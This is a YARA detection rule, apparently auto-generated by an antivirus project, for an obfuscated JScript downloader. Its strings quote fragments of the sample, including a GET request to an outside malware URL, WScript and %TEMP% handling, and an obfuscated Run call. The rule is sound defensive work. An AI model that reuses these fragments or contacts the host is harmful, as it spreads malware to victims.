rule sig_20160428_f2655114a494a4ae6739dc65dc2539f0 {
  meta:
    description = "datamaliciousorder - file 20160428_f2655114a494a4ae6739dc65dc2539f0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "855bc8baddf460b4721e5da6623f4428519f8f6ee6212f2d1ae7356eb614b32f"

  strings:
    $s1  = "PviHqjKzhToxKgcRcpMtv[ZvyYitWndFlvUglIuvUfu](\"G\" + \"ET\", \"http://laichaupc.com/m8eusk\", false);" fullword ascii
    $s2  = "function QznJvaXgoTlgPzgBorIyx(AcyBtsWhfUavIcgQcfZld){OknGvnQysQcbMouZpcGag[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function AlxJlpGgoEkjSqfEsoYgf() {return OknGvnQysQcbMouZpcGag[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function QznJvaXgoTlgPzgBorIyx(AcyBtsWhfUavIcgQcfZld){OknGvnQysQcbMouZpcGag[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "function NdqCnsGvoIojBetSkcNcb(QfwNsqGvzCycRbgEmqWrd, UpvGrqSdjUilQpaUnhRkh){VhpVcwLpeOriAlyGeyJvk = VhpVcwLpeOriAlyGeyJvk * 1; " ascii
    $s6  = "return QfwNsqGvzCycRbgEmqWrd - UpvGrqSdjUilQpaUnhRkh;};" fullword ascii
    $s7  = "var OknGvnQysQcbMouZpcGag = function VxlLclEnfUlaXkqOetSsm() {return WlkDdgPnxCnhKryCwuHxg[ActDieGlgBwqLtvYceJyl](\"WScript\"+\"" ascii
    $s8  = "var WlkDdgPnxCnhKryCwuHxg = this[\"WScript\"];" fullword ascii
    $s9  = "var OknGvnQysQcbMouZpcGag = function VxlLclEnfUlaXkqOetSsm() {return WlkDdgPnxCnhKryCwuHxg[ActDieGlgBwqLtvYceJyl](\"WScript\"+\"" ascii
    $s10 = "function AlxJlpGgoEkjSqfEsoYgf() {return OknGvnQysQcbMouZpcGag[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (PviHqjKzhToxKgcRcpMtv[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function DaoEpsXhpJdgKfpQpiOva(){return ZpuZsiWbnDdbRoeOyuEbt + \"\";};" fullword ascii
    $s13 = "function NdqCnsGvoIojBetSkcNcb(QfwNsqGvzCycRbgEmqWrd, UpvGrqSdjUilQpaUnhRkh){VhpVcwLpeOriAlyGeyJvk = VhpVcwLpeOriAlyGeyJvk * 1; " ascii
    $s14 = "function LhaBnlDebXgxLzbBqoQrk() {return ((OzaGsjLkzZgyKtdGmkLhd == true) && (OzaGsjLkzZgyKtdGmkLhd == XwsEfiQznGleFrwNnkCxs)) ?" ascii
    $s15 = "function LhaBnlDebXgxLzbBqoQrk() {return ((OzaGsjLkzZgyKtdGmkLhd == true) && (OzaGsjLkzZgyKtdGmkLhd == XwsEfiQznGleFrwNnkCxs)) ?" ascii
    $s16 = "CcxHasQscEkkRonZusKyg = true;" fullword ascii
    $s17 = "function JksZmiEesRuzPmeTanXiu(ZmnAzdGrjMifAtfVkjSjm) {var BkyXowMofFowFxwTeuHwl = (1, 2, 3, 4, 5, ZmnAzdGrjMifAtfVkjSjm); retur" ascii
    $s18 = "return NdqCnsGvoIojBetSkcNcb(1 == 1 ? NemUluSpwOhaXwgFzyXbg : 0, 1 == 1 ? IrdIgoJyeKmzDoyNoiVrl : 0);" fullword ascii
    $s19 = "}while (WezEdzJvuMvtIvaDfkTvs);" fullword ascii
    $s20 = "function JksZmiEesRuzPmeTanXiu(ZmnAzdGrjMifAtfVkjSjm) {var BkyXowMofFowFxwTeuHwl = (1, 2, 3, 4, 5, ZmnAzdGrjMifAtfVkjSjm); retur" ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}